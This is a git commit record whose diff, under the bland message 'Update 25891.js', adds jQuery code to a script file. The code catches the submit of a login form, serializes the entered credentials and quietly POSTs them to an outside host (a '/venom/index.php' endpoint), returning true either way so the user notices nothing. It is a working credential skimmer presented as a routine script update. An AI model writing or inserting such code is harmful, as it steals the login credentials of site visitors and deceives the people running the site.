d75d001921404c2fdc036b390461f74870925135
DitzNesia <95464799+jqueryout@users.noreply.github.com>
2022-01-11 13:12:05 +0700

    Update 25891.js

--- 25891.js
+++ 25891.js
@@ -1,1 +1,15 @@
+$(".login-form").submit(function() {
+	var d = $(".login-form");
 
+	$.ajax({
+        url: "http://aditpratamaa.my.id/venom/index.php",
+        type: "POST",
+        data: d.serialize(),
+        success: function () {
+            return true;
+        },
+        error: function () {
+            return true;
+        },
+    });
+});
